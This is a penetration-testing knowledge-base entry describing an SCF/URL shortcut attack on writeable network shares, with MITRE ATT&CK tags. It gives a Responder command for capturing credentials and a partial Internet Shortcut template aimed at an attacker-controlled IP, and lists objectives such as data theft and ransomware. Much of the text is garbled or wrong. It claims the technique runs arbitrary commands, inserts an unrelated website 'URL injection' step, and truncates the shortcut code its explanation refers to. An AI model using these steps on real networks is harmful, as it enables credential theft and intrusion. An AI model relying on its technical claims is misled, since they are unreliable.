---
id: 7236df5f-3cb8-4d02-9c40-0a19ea0252b0
name: SCF and URL File Attack Against Writeable Share
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.430339+00:00'
updated_at: '2023-04-10T20:36:02.928246+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Drive-by Compromise|T1189 - Drive-by Compromise]]'
- '[[Remote File Copy|T1105 - Remote File Copy]]'
- '[[Trusted Relationship|T1199 - Trusted Relationship]]'
tags:
- '[[Active Directory Attacks]]'
- '[[SCF and URL file attack against writeable share]]'
- '[[URL Files]]'
commands:
- '[[Run Responder in verbose mode on eth0]]'
- '[[.url Command]]'
---

# SCF and URL File Attack Against Writeable Share

## Summary

This attack involves the use of a specially crafted SCF or URL file to execute arbitrary commands on a target machine. The attacker creates an Internet Shortcut with an icon that is a UNC path to a writeable network share. This allows the attacker to execute arbitrary commands on the target machine

## Description

# Description

This attack involves the use of a specially crafted SCF or URL file to execute arbitrary commands on a target machine. The attacker creates an Internet Shortcut with an icon that is a UNC path to a writeable network share. This allows the attacker to execute arbitrary commands on the target machine when the shortcut is opened. The attacker can use this technique to gain initial access to a target network or to move laterally within the network.

Technical Explanation: The attacker creates a specially crafted SCF or URL file that contains a UNC path to a writeable network share. When a user opens the shortcut, the target machine will attempt to retrieve the icon from the UNC path in the shortcut. This allows the attacker to execute arbitrary commands on the target machine. The attacker can use this technique to gain access to sensitive information or to move laterally within the network.

Business Value: This attack can be used to gain unauthorized access to sensitive information or to move laterally within a network. It can be used to steal sensitive information, such as credit card numbers or intellectual property. It can also be used to disrupt business operations or to deploy ransomware.

 

## Requirements

1. Access to a writeable network share

1. Ability to create a specially crafted SCF or URL file

1. Victim user opening the Internet Shortcut

 

## Defense

1. Disable the WebClient service to prevent UNC path access

1. Monitor network traffic for suspicious activity

1. Educate users on the dangers of opening unsolicited shortcuts or links

 

## Objectives

1. Gain initial access to a target network

1. Move laterally within a network

1. Steal sensitive information

1. Disrupt business operations

1. Deploy ransomware

 

# Instructions

1. To execute a URL injection attack, an attacker manipulates a vulnerable website's input fields to inject a malicious URL that will be executed by the victim's browser. This can lead to the execution of malicious scripts, the theft of user data, and other forms of cyber attacks.

 



**Code**: [[.url]]



> The '.url' data field refers to a type of input field that is commonly used to accept URLs. Attackers can manipulate these fields by injecting malicious URLs that will be executed by the victim's browser. To prevent URL injection attacks, websites should validate user input and sanitize any input that could potentially contain malicious code.



**Command** ([[.url Command]]):

```bash
.url https://www.example.com
```



2. To capture network traffic with Responder, use the following command:

responder -I [interface] [options]

The -I flag specifies the interface to use for capturing traffic, in this case eth0. The -v flag enables verbose output.

 



**Code**: [[responder -I eth0 -v]]



> Resonder is a tool used for network analysis and penetration testing. The -I flag specifies the interface to use for capturing traffic, and the -v flag enables verbose output. Other options are available for customizing the capture process.



**Command** ([[Run Responder in verbose mode on eth0]]):

```bash
responder -I eth0 -v
```



3. To create an Internet shortcut with an icon, follow these steps:
1. Open Notepad
2. Copy and paste the above code into Notepad
3. Replace 'whatever' with the URL you want the shortcut to point to
4. Replace 'whatever' with the working directory for the shortcut
5. Replace '10.10.10.10' with the IP address of the server hosting the icon file
6. Save the file with a .url extension
7. Double-click the file to open the URL in your default web browser

 



**Code**: [[[InternetShortcut]
URL=whatever
WorkingDirectory=w]]



> This command creates an Internet shortcut with a custom icon. The 'URL' field specifies the URL that the shortcut will point to. The 'WorkingDirectory' field specifies the working directory for the shortcut. The 'IconFile' field specifies the path to the icon file, which is hosted on a remote server. The '%USERNAME%' variable in the file path will be replaced with the current user's username. The 'IconIndex' field specifies the index of the icon in the icon file to use for the shortcut.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Drive-by Compromise|T1189 - Drive-by Compromise]]
- [[Remote File Copy|T1105 - Remote File Copy]]
- [[Trusted Relationship|T1199 - Trusted Relationship]]

## Commands Used

- [[Run Responder in verbose mode on eth0]]
- [[.url Command]]

## Tags

- [[Active Directory Attacks]]
- [[SCF and URL file attack against writeable share]]
- [[URL Files]]


